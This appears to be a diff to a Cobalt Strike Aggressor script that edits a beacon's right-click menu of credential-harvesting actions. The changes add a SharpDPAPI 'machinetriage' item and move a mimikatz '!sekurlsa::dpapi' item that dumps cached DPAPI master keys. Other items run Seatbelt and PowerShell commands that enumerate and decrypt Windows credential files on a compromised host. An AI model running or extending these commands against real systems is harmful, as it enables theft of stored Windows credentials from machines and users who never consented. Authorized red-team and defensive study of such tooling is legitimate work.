@@ -618,13 +618,8 @@ popup beacon_bottom
 	    {
 	        item "Credential Manager"
 	        {
-				binput($1, "Seatbelt.exe WindowsCredentialFiles");
-				bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), "WindowsCredentialFiles");
-	        }
-	        item "Get Master Key cached (admin)"
-	        {
-				binput($1, "mimikatz !sekurlsa::dpapi");
-                bmimikatz($1, "!sekurlsa::dpapi");
+			binput($1, "Seatbelt.exe WindowsCredentialFiles");
+			bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), "WindowsCredentialFiles");
 	        }
 		item "List Master keys files"
 		{
@@ -634,6 +629,16 @@ popup beacon_bottom
 		{
 			bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials", '', '', &result_ps);
 		}
+		item "SharpDPAPI machinetriage (admin)"
+		{
+			binput($1, "SharpDPAPI.exe machinetriage /showall");
+			bexecute_assembly($1, script_resource('Tools/SharpDPAPI.exe'), "machinetriage /showall");
+		}
+	        item "Get Master Key cached (admin)"
+	        {
+			binput($1, "mimikatz !sekurlsa::dpapi");
+			bmimikatz($1, "!sekurlsa::dpapi");
+	        }
 		item "Decrypt current user Credentials"
 		{
 			bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_creds);
@@ -642,7 +647,7 @@ popup beacon_bottom
 		{
 			bpowerpick($1, "gci -hidden C:/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_task_creds);
 		}
-		}
+	     }
 		menu "ADCS"
 	    {
 	        item "Finding Certificate Authorities"
